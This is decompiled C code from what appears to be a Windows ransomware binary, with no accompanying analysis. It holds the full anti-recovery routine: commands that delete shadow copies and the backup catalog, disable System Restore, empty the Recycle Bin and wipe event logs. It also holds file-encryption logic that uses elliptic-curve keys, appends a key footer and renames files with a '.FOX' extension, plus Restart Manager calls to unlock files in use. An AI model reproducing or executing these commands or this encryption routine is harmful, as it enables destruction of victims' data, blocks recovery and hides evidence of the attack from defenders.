  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v32, &v11, 80);
  sub_14000E370(&v11, v32);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  v7 = 24;
  for ( k = 24; k != 0; --k )
  {
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
  }
  sub_14000D9F0(&v11, v30, v32);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v37, &v11, 80);
  sub_14000E370(&v11, v37);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000E370(&v11, v30);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  for ( m = 49; m != 0; --m )
  {
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
  }
  sub_14000D9F0(&v11, v29, v37);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000E370(&v11, v30);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  do
  {
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
    --v7;
  }
  while ( v7 != 0 );
  sub_14000D9F0(&v11, v30, v32);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000E370(&v11, v30);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000E370(&v11, v30);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000D9F0(&v11, v30, v38);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  return sub_140016F80(a1, &v11, 80);
}


// ----- sub_1400118E0 @ 0x1400118e0 -----
void __fastcall sub_1400118E0(const CHAR *lpBuffer, const CHAR *a2, int a3)
{
  DWORD v6; // eax
  DWORD v7; // eax
  DWORD v8; // eax
  CHAR String[40]; // [rsp+30h] [rbp-28h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+78h] [rbp+20h] BYREF

  EnterCriticalSection(&CriticalSection);
  wsprintfA(String, "%lu", a3);
  v6 = lstrlenA(lpBuffer);
  WriteFile(hFile, lpBuffer, v6, &NumberOfBytesWritten, nullptr);
  WriteFile(hFile, ", Error Code: ", 0xEu, &NumberOfBytesWritten, nullptr);
  v7 = lstrlenA(String);
  WriteFile(hFile, String, v7, &NumberOfBytesWritten, nullptr);
  WriteFile(hFile, " -> ", 4u, &NumberOfBytesWritten, nullptr);
  v8 = lstrlenA(a2);
  WriteFile(hFile, a2, v8, &NumberOfBytesWritten, nullptr);
  WriteFile(hFile, "\r\n", 2u, &NumberOfBytesWritten, nullptr);
  LeaveCriticalSection(&CriticalSection);
}


// ----- sub_140011A30 @ 0x140011a30 -----
HANDLE __fastcall sub_140011A30(LPCWSTR lpFileName)
{
  HANDLE result; // rax

  InitializeCriticalSection(&CriticalSection);
  result = CreateFileW(lpFileName, 0x40000000u, 1u, nullptr, 4u, 0x80u, nullptr);
  hFile = result;
  return result;
}


// ----- sub_140011A90 @ 0x140011a90 -----
BOOL sub_140011A90()
{
  DeleteCriticalSection(&CriticalSection);
  return CloseHandle(hFile);
}


// ----- sub_140011AC0 @ 0x140011ac0 -----
DWORD sub_140011AC0()
{
  DWORD result; // eax
  HANDLE Handles; // [rsp+30h] [rbp-38h] BYREF
  HANDLE hObject; // [rsp+38h] [rbp-30h]
  HANDLE Thread; // [rsp+40h] [rbp-28h]
  HANDLE v4; // [rsp+48h] [rbp-20h]
  HANDLE v5; // [rsp+50h] [rbp-18h]

  Handles = CreateThread(nullptr, 0, StartAddress, nullptr, 0, nullptr);
  hObject = CreateThread(nullptr, 0, sub_140011C50, nullptr, 0, nullptr);
  Thread = CreateThread(nullptr, 0, sub_140011CD0, nullptr, 0, nullptr);
  v4 = CreateThread(nullptr, 0, sub_140011CF0, nullptr, 0, nullptr);
  v5 = CreateThread(nullptr, 0, sub_140011D30, nullptr, 0, nullptr);
  result = WaitForMultipleObjects(5u, &Handles, true, 0x7530u);
  if ( Handles != nullptr )
    result = CloseHandle(Handles);
  if ( hObject != nullptr )
    result = CloseHandle(hObject);
  if ( Thread != nullptr )
    result = CloseHandle(Thread);
  if ( v4 != nullptr )
    result = CloseHandle(v4);
  if ( v5 != nullptr )
    return CloseHandle(v5);
  return result;
}


// ----- StartAddress @ 0x140011bf0 -----
HINSTANCE __fastcall StartAddress(LPVOID lpThreadParameter)
{
  ShellExecuteW(nullptr, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", nullptr, 0);
  return ShellExecuteW(nullptr, L"open", L"wmic.exe", L"shadowcopy delete", nullptr, 0);
}


// ----- sub_140011C50 @ 0x140011c50 -----
DWORD __fastcall sub_140011C50(LPVOID lpThreadParameter)
{
  DWORD result; // eax
  int Data; // [rsp+40h] [rbp+8h] BYREF
  HKEY hKey; // [rsp+48h] [rbp+10h] BYREF

  Data = 1;
  result = RegOpenKeyExA(
             HKEY_LOCAL_MACHINE,
             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore",
             0,
             2u,
             &hKey);
  if ( result == 0 )
  {
    RegSetValueExA(hKey, "DisableSR", 0, 4u, (const BYTE *)&Data, 4u);
    return RegCloseKey(hKey);
  }
  return result;
}


// ----- sub_140011CD0 @ 0x140011cd0 -----
HRESULT __fastcall sub_140011CD0(LPVOID lpThreadParameter)
{
  return SHEmptyRecycleBinA(nullptr, nullptr, 7u);
}


// ----- sub_140011CF0 @ 0x140011cf0 -----
HINSTANCE __fastcall sub_140011CF0(LPVOID lpThreadParameter)
{
  return ShellExecuteW(nullptr, L"open", L"cmd.exe", L"/c wbadmin delete catalog -quiet", nullptr, 0);
}


// ----- sub_140011D30 @ 0x140011d30 -----
HINSTANCE __fastcall sub_140011D30(LPVOID lpThreadParameter)
{
  return ShellExecuteW(
           nullptr,
           L"open",
           L"cmd.exe",
           L"/c wevtutil.exe cl System & wevtutil.exe cl Security & wevtutil.exe cl Application",
           nullptr,
           0);
}


// ----- sub_140011D70 @ 0x140011d70 -----
__int64 __fastcall sub_140011D70(LPCWSTR lpFileName)
{
  HANDLE FileW; // rax
  __int64 v3; // rbx
  LARGE_INTEGER v4; // rdi
  unsigned int v5; // eax
  unsigned int v6; // r12d
  void *v7; // r14
  __int64 v8; // rax
  const void *v9; // rsi
  LARGE_INTEGER v10; // r15
  void *v11; // r12
  __int64 v12; // rax
  const void *v13; // r13
  LARGE_INTEGER FileSize; // [rsp+40h] [rbp-C0h] BYREF
  __int128 v16; // [rsp+48h] [rbp-B8h] BYREF
  _BYTE v17[31]; // [rsp+58h] [rbp-A8h] BYREF
  char v18; // [rsp+77h] [rbp-89h]
  _QWORD v19[4]; // [rsp+80h] [rbp-80h] BYREF
  __int64 v20; // [rsp+A0h] [rbp-60h] BYREF
  int v21; // [rsp+A8h] [rbp-58h]
  __int128 v22; // [rsp+ACh] [rbp-54h]
  __int128 v23; // [rsp+BCh] [rbp-44h]
  __int64 v24; // [rsp+D0h] [rbp-30h] BYREF
  int v25; // [rsp+D8h] [rbp-28h]
  _QWORD v26[8]; // [rsp+F0h] [rbp-10h] BYREF
  _QWORD v27[4]; // [rsp+130h] [rbp+30h] BYREF
  _QWORD v28[4]; // [rsp+150h] [rbp+50h] BYREF
  _BYTE v29[32]; // [rsp+170h] [rbp+70h] BYREF
  _DWORD Buffer[2]; // [rsp+190h] [rbp+90h] BYREF
  _QWORD v31[6]; // [rsp+198h] [rbp+98h] BYREF
  int v32; // [rsp+1C8h] [rbp+C8h]
  __int128 v33; // [rsp+1CCh] [rbp+CCh]
  LARGE_INTEGER v34; // [rsp+1DCh] [rbp+DCh]
  int v35; // [rsp+1E4h] [rbp+E4h]
  _BYTE v36[32]; // [rsp+1E8h] [rbp+E8h] BYREF
  _BYTE v37[552]; // [rsp+208h] [rbp+108h] BYREF
  WCHAR String1[264]; // [rsp+430h] [rbp+330h] BYREF
  _BYTE v39[520]; // [rsp+640h] [rbp+540h] BYREF
  DWORD NumberOfBytesRead; // [rsp+898h] [rbp+798h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+8A0h] [rbp+7A0h] BYREF
  DWORD v43; // [rsp+8A8h] [rbp+7A8h] BYREF

  if ( (unsigned int)sub_140016940(v29) == 0 )
    return 0;
  if ( (unsigned int)sub_140016990(v39) == 0 )
    return 0;
  SetFileAttributesW(lpFileName, 0x80u);
  FileW = CreateFileW(lpFileName, 0xC0000000, 0, nullptr, 3u, 0x8000000u, nullptr);
  v3 = (__int64)FileW;
  if ( FileW == (HANDLE)-1LL )
    return 0;
  if ( !GetFileSizeEx(FileW, &FileSize)
    || (unsigned __int64)(FileSize.QuadPart - 16) > 0x13FFFFFF0LL
    || (unsigned int)sub_140016A10(v17, 32) == 0 )
  {
    CloseHandle((HANDLE)v3);
    return 0;
  }
  v17[0] &= 0xF8u;
  v18 = v18 & 0x3F | 0x40;
  sub_14000D760((__int64)v27, (__int64)v17, (__int64)L"\t");
  sub_14000D760((__int64)v28, (__int64)v17, (__int64)v29);
  sub_14000C8E0(v28, 0x20u, (__int64)v26, 64);
  qmemcpy(v19, v26, sizeof(v19));
  v22 = *(_OWORD *)&v26[4];
  v23 = *(_OWORD *)&v26[6];
  sub_14000C8E0(v26, 0x40u, (__int64)&v24, 32);
  v20 = v24;
  v21 = v25;
  sub_1400169E0(v26, 64);
  sub_1400169E0(&v24, 32);
  v4 = FileSize;
  if ( FileSize.QuadPart >= 5242880 )
  {
    v5 = 5242880;
    if ( FileSize.QuadPart < 52428800 )
      v5 = 0x200000;
    v4.QuadPart = v5;
  }
  v6 = 0;
  if ( v4.QuadPart > 0x100000uLL )
    v4.QuadPart = 0x100000;
  v7 = (void *)((__int64 (__fastcall *)(_QWORD))sub_140016FD0)((LARGE_INTEGER)v4.QuadPart);
  v8 = ((__int64 (__fastcall *)(_QWORD))sub_140016FD0)((LARGE_INTEGER)v4.QuadPart);
  v9 = (const void *)v8;
  if ( v7 != nullptr && v8 != 0 )
  {
    v10 = FileSize;
    v16 = 0;
    if ( FileSize.QuadPart >= 5242880 )
    {
      SetFilePointer((HANDLE)v3, 0, nullptr, 0);
      ReadFile((HANDLE)v3, v7, v4.LowPart, &NumberOfBytesRead, nullptr);
      sub_14000D390((__int64)v9, (__int64)&v16, (__int64)v7, NumberOfBytesRead, 0, 0, (__int64)&v20, v19);
      SetFilePointer((HANDLE)v3, 0, nullptr, 0);
      WriteFile((HANDLE)v3, v9, NumberOfBytesRead, &NumberOfBytesWritten, nullptr);
    }
    else
    {
      v11 = (void *)((__int64 (__fastcall *)(_QWORD))sub_140016FD0)((LARGE_INTEGER)FileSize.QuadPart);
      v12 = ((__int64 (__fastcall *)(_QWORD))sub_140016FD0)((LARGE_INTEGER)v10.QuadPart);
      v13 = (const void *)v12;
      if ( v11 != nullptr && v12 != 0 )
      {
        SetFilePointer((HANDLE)v3, 0, nullptr, 0);
        ReadFile((HANDLE)v3, v11, v10.LowPart, &NumberOfBytesRead, nullptr);
        sub_14000D390((__int64)v13, (__int64)&v16, (__int64)v11, v10.QuadPart, 0, 0, (__int64)&v20, v19);
        SetFilePointer((HANDLE)v3, 0, nullptr, 0);
        WriteFile((HANDLE)v3, v13, v10.LowPart, &NumberOfBytesWritten, nullptr);
        ((void (__fastcall *)(_QWORD, _QWORD))sub_1400169E0)(v11, (LARGE_INTEGER)v10.QuadPart);
        sub_140017010(v11);
        sub_140017010(v13);
      }
    }
    sub_1400230C0(v31, 0, 656);
    qmemcpy(Buffer, "2XOF6202", sizeof(Buffer));
    v31[0] = sub_140019FA0(0);
    v6 = 1;
    qmemcpy(&v31[1], v27, 32);
    v31[5] = v20;
    v32 = v21;
    v33 = v16;
    v34 = FileSize;
    v35 = 1;
    sub_140022A10(v37, v39, 512);
    sub_14000C8E0(Buffer, 0x258u, (__int64)v36, 32);
    SetFilePointer((HANDLE)v3, 0, nullptr, 2u);
    WriteFile((HANDLE)v3, Buffer, 0x298u, &v43, nullptr);
    CloseHandle((HANDLE)v3);
    v3 = -1;
    lstrcpyW(String1, lpFileName);
    lstrcatW(String1, L".FOX");
    MoveFileExW(lpFileName, String1, 9u);
  }
  sub_1400169E0(v17, 32);
  sub_1400169E0(v28, 32);
  sub_1400169E0(v19, 76);
  if ( v7 != nullptr )
  {
    ((void (__fastcall *)(_QWORD, _QWORD))sub_1400169E0)(v7, (LARGE_INTEGER)v4.QuadPart);
    sub_140017010(v7);
  }
  if ( v9 != nullptr )
  {
    ((void (__fastcall *)(_QWORD, _QWORD))sub_1400169E0)(v9, (LARGE_INTEGER)v4.QuadPart);
    sub_140017010(v9);
  }
  if ( v3 != -1 )
    CloseHandle((HANDLE)v3);
  return v6;
}


// ----- sub_140012300 @ 0x140012300 -----
__int64 __fastcall sub_140012300(_OWORD *a1, __int64 a2)
{
  __int128 v3; // xmm1
  __int128 v4; // xmm0
  __int128 v5; // xmm1
  int v6; // eax
  __int64 v8; // [rsp+20h] [rbp-68h] BYREF
  int v9; // [rsp+28h] [rbp-60h]
  _QWORD v10[8]; // [rsp+40h] [rbp-48h] BYREF

  sub_14000C8E0(a1, 0x20u, (__int64)v10, 64);
  v3 = *(_OWORD *)&v10[2];
  *(_OWORD *)a2 = *(_OWORD *)v10;
  v4 = *(_OWORD *)&v10[4];
  *(_OWORD *)(a2 + 16) = v3;
  v5 = *(_OWORD *)&v10[6];
  *(_OWORD *)(a2 + 44) = v4;
  *(_OWORD *)(a2 + 60) = v5;
  sub_14000C8E0(v10, 0x40u, (__int64)&v8, 32);
  v6 = v9;
  *(_QWORD *)(a2 + 32) = v8;
  *(_DWORD *)(a2 + 40) = v6;
  sub_1400169E0(v10, 64);
  return sub_1400169E0(&v8, 32);
}


// ----- sub_1400123A0 @ 0x1400123a0 -----
__int64 __fastcall sub_1400123A0(__int64 a1)
{
  int v1; // ebx
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int16 v5; // ax

  v1 = 0;
  if ( off_140026340[0] == nullptr )
    return 0;
  while ( 1 )
  {
    v3 = v1;
    v4 = lstrlenW(off_140026340[v1]);
    if ( (unsigned int)sub_14001A180(a1, off_140026340[v1], v4) == 0 )
    {
      v5 = *(_WORD *)(a1 + 2 * v4);
      if ( v5 == 92 || v5 == 0 )
        break;
    }
    ++v1;
    if ( off_140026340[v3 + 1] == nullptr )
      return 0;
  }
  return 1;
}


// ----- sub_140012430 @ 0x140012430 -----
__int64 __fastcall sub_140012430(LPCWSTR lpString)
{
  int v1; // r12d
  __int64 v3; // r13
  wchar_t *v4; // rdi
  wchar_t *v5; // rax
  __int64 v6; // rbx
  WCHAR v7; // ax
  wchar_t *v9; // r15
  unsigned __int64 v10; // rbx
  __int64 v11; // rbp
  __int64 v12; // r14
  unsigned __int64 v13; // r14
  WCHAR v14; // cx

  v1 = 0;
  if ( off_140026390[0] == nullptr )
    return 0;
  while ( 1 )
  {
    v3 = v1;
    v4 = off_140026390[v1];
    v5 = v4;
    if ( *v4 != 0 )
      break;
LABEL_5:
    v6 = lstrlenW(v4);
    if ( (unsigned int)sub_14001A180(lpString, v4, v6) == 0 )
    {
      v7 = lpString[v6];
      if ( v7 == 92 || v7 == 0 )
        return 1;
    }
LABEL_8:
    ++v1;
    if ( off_140026390[v3 + 1] == nullptr )
      return 0;
  }
  while ( *v5 != 42 )
  {
    if ( *++v5 == 0 )
      goto LABEL_5;
  }
  v9 = v5 + 1;
  v10 = v5 - v4;
  v11 = lstrlenW(v5 + 1);
  v12 = lstrlenW(lpString);
  if ( (unsigned int)sub_14001A180(lpString, v4, v10) != 0 )
    goto LABEL_8;
  v13 = v12 - v11;
  if ( v10 > v13 )
    goto LABEL_8;
  while ( 1 )
  {
    if ( (unsigned int)sub_14001A180(&lpString[v10], v9, v11) == 0 )
    {
      v14 = lpString[v10 + v11];
      if ( v14 == 92 || v14 == 0 )
        return 1;
    }
    if ( ++v10 > v13 )
      goto LABEL_8;
  }
}


// ----- sub_140012570 @ 0x140012570 -----
// attributes: thunk
__int64 __fastcall sub_140012570(LPCWSTR lpFileName)
{
  return sub_140011D70(lpFileName);
}


// ----- sub_140012580 @ 0x140012580 -----
int __fastcall sub_140012580(const WCHAR *a1)
{
  int v1; // eax
  WCHAR *v2; // rax
  WCHAR *v3; // r12
  __int64 v4; // r13
  int v5; // edi
  HANDLE FileW; // rsi
  BOOL v7; // r14d
  DWORD v8; // eax
  BOOL v9; // r14d
  DWORD List; // eax
  UINT i; // r15d
  __int64 v12; // rsi
  RM_APP_TYPE ApplicationType; // eax
  DWORD CurrentProcessId; // eax
  DWORD dwProcessId; // r8d
  HANDLE v16; // rax
  void *v17; // rdi
  WCHAR *strAppName; // r14
  int v19; // eax
  int v20; // edi
  __int64 v21; // rax
  WCHAR *v22; // rcx
  CHAR *v23; // rsi
  int v24; // eax
  DWORD v25; // eax
  int v26; // eax
  int v27; // edi
  CHAR *v28; // rsi
  int v29; // eax
  const CHAR *v30; // rcx
  int v31; // eax
  int v32; // edi
  int v33; // eax
  void *v34; // r14
  LARGE_INTEGER v35; // rdi
  LONGLONG v36; // r8
  LONGLONG v37; // r15
  int v38; // eax
  int v39; // edi
  CHAR *v40; // rsi
  int v41; // eax
  int v42; // r8d
  const CHAR *v43; // rcx
  const CHAR *v44; // rdx
  int v45; // eax
  int v46; // edi
  int v47; // eax
  DWORD v48; // eax
  LONGLONG v49; // r15
  int v50; // eax
  int v51; // edi
  CHAR *v52; // rsi
  int v53; // eax
  DWORD LastError; // eax
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-C0h] BYREF
  DWORD dwRebootReasons; // [rsp+44h] [rbp-BCh] BYREF
  UINT pnProcInfoNeeded; // [rsp+48h] [rbp-B8h] BYREF
  LARGE_INTEGER FileSize; // [rsp+50h] [rbp-B0h] BYREF
  BYTE v60[32]; // [rsp+60h] [rbp-A0h] BYREF
  BYTE pbBuffer[31]; // [rsp+80h] [rbp-80h] BYREF
  char v62; // [rsp+9Fh] [rbp-61h]
  _BYTE v63[32]; // [rsp+A0h] [rbp-60h] BYREF
  _BYTE Buffer[32]; // [rsp+C0h] [rbp-40h] BYREF
  int v65; // [rsp+E0h] [rbp-20h]
  __int64 v66; // [rsp+E8h] [rbp-18h]
  __m128i si128; // [rsp+F0h] [rbp-10h]
  __int64 v68; // [rsp+100h] [rbp+0h]
  unsigned __int8 v69[32]; // [rsp+110h] [rbp+10h] BYREF
  _BYTE v70[32]; // [rsp+130h] [rbp+30h] BYREF
  WCHAR strSessionKey[40]; // [rsp+150h] [rbp+50h] BYREF
  _BYTE v72[4228]; // [rsp+1A0h] [rbp+A0h] BYREF
  _BYTE v73[76]; // [rsp+1224h] [rbp+1124h] BYREF
  RM_PROCESS_INFO rgAffectedApps[10]; // [rsp+1270h] [rbp+1170h] BYREF
  LPCWSTR lpString; // [rsp+2CE0h] [rbp+2BE0h] BYREF
  DWORD NumberOfBytesRead; // [rsp+2CE8h] [rbp+2BE8h] BYREF
  UINT pnProcInfo; // [rsp+2CF0h] [rbp+2BF0h] BYREF
  DWORD pSessionHandle; // [rsp+2CF8h] [rbp+2BF8h] BYREF

  lpString = a1;
  v63[0] = 9;
  memset(&v63[1], 0, 31);
  v66 = 0x6420676E756F6863LL;
  si128 = _mm_load_si128((const __m128i *)&xmmword_140002A20);
  v68 = 0x2121676F6420746FLL;
  SetFileAttributesW(a1, 0x80u);
  v1 = lstrlenW(lpString);
  v2 = (WCHAR *)sub_140016FD0(2LL * (v1 + 7));
  v3 = v2;
  if ( v2 == nullptr )
    return (int)v2;
  lstrcpyW(v2, lpString);
  lstrcatW(v3, L".FOX");
  LODWORD(v2) = MoveFileExW(lpString, v3, 9u);
  if ( (_DWORD)v2 == 0 )
  {
    if ( dword_140027180 != 0 )
    {
      v50 = lstrlenW(lpString);
      v51 = WideCharToMultiByte(0xFDE9u, 0, lpString, v50, nullptr, 0, nullptr, nullptr);
      v52 = (CHAR *)sub_140016FD0(v51);
      v53 = lstrlenW(lpString);
      WideCharToMultiByte(0xFDE9u, 0, lpString, v53, v52, v51, nullptr, nullptr);
      LastError = GetLastError();
      sub_1400118E0("Can't MoveFileExW", v52, LastError);
      LODWORD(v2) = sub_140017010(v52);
    }
    return (int)v2;
  }
  v4 = 3;
  v5 = 1;
  FileW = CreateFileW(v3, 0xC0000000, 0, nullptr, 3u, 0x8000000u, nullptr);
  LODWORD(v2) = sub_140017010(v3);
  if ( FileW != (HANDLE)-1LL )
  {
LABEL_24:
    GetFileSizeEx(FileW, &FileSize);
    v34 = (void *)sub_140016FD0(0x100000);
    if ( v34 != nullptr )
    {
      CryptGenRandom(hProv, 0x20u, pbBuffer);
      pbBuffer[0] &= 0xF8u;
      v62 = v62 & 0x3F | 0x40;
      sub_14000D760((__int64)Buffer, (__int64)pbBuffer, (__int64)v63);
      sub_14000D760((__int64)v60, (__int64)pbBuffer, (__int64)aCurvpattern);
      sub_1400186F0(v60, 32, v69);
      sub_140015C50(v72, v69, 256);
      sub_140015CC0(v72, v70);
      v65 = sub_14000D730(v69, 64);
      sub_140016F40(v73, 0, 64);
      sub_140016F40(v69, 0, 64);
      sub_140016F40(v60, 0, 64);
      v35.QuadPart = 0;
      SetFilePointerEx(FileW, 0, nullptr, 0);
      LODWORD(v36) = FileSize.LowPart;
      if ( FileSize.QuadPart <= 20971520 )
      {
        if ( FileSize.QuadPart <= 5242880 )
        {
          if ( FileSize.QuadPart > 0 )
          {
            if ( FileSize.QuadPart > 64 )
              v36 = FileSize.QuadPart / 10;
            ReadFile(FileW, v34, v36, &NumberOfBytesRead, nullptr);
            sub_140016280(0, (unsigned int)v72, (_DWORD)v34, (_DWORD)v34, NumberOfBytesRead);
            SetFilePointerEx(FileW, 0, nullptr, 0);
            WriteFile(FileW, v34, NumberOfBytesRead, &NumberOfBytesWritten, nullptr);
          }
        }
        else
        {
          v49 = FileSize.QuadPart / 3;
          do
          {
            ReadFile(FileW, v34, 0x100000u, &NumberOfBytesRead, nullptr);
            sub_140016280(0, (unsigned int)v72, (_DWORD)v34, (_DWORD)v34, NumberOfBytesRead);
            SetFilePointerEx(FileW, v35, nullptr, 0);
            WriteFile(FileW, v34, NumberOfBytesRead, &NumberOfBytesWritten, nullptr);
            v35.QuadPart += v49;
            SetFilePointerEx(FileW, v35, nullptr, 0);
            --v4;
          }
          while ( v4 != 0 );
        }
      }
      else
      {
        v37 = FileSize.QuadPart / 10485760;
        if ( FileSize.QuadPart / 10485760 > 0 )
        {
          do
          {
            ReadFile(FileW, v34, 0x100000u, &NumberOfBytesRead, nullptr);
            sub_140016280(0, (unsigned int)v72, (_DWORD)v34, (_DWORD)v34, NumberOfBytesRead);
            SetFilePointerEx(FileW, v35, nullptr, 0);
            WriteFile(FileW, v34, 0x100000u, &NumberOfBytesWritten, nullptr);
            v35.QuadPart += 10485760LL;
            SetFilePointerEx(FileW, v35, nullptr, 0);
            --v37;
          }
          while ( v37 != 0 );
        }
      }
      sub_140016F40(v72, 0, 4300);
      SetFilePointerEx(FileW, 0, nullptr, 2u);
      WriteFile(FileW, Buffer, 0x48u, &NumberOfBytesWritten, nullptr);
      sub_140017010(v34);
    }
    LODWORD(v2) = CloseHandle(FileW);
    return (int)v2;
  }
  while ( v5 != 0 )
  {
    sub_140016F40(strSessionKey, 0, 66);
    LODWORD(v2) = RmStartSession(&pSessionHandle, 0, strSessionKey);
    v7 = (_DWORD)v2 == 0;
    if ( (_DWORD)v2 != 0 )
    {
      if ( dword_140027180 == 0 )
        return (int)v2;
      v38 = lstrlenW(lpString);
      v39 = WideCharToMultiByte(0xFDE9u, 0, lpString, v38, nullptr, 0, nullptr, nullptr);
      v40 = (CHAR *)sub_140016FD0(v39);
      v41 = lstrlenW(lpString);
      WideCharToMultiByte(0xFDE9u, 0, lpString, v41, v40, v39, nullptr, nullptr);
      v42 = v7;
      v43 = "Can't RmStartSession";
      v44 = v40;
      goto LABEL_31;
    }
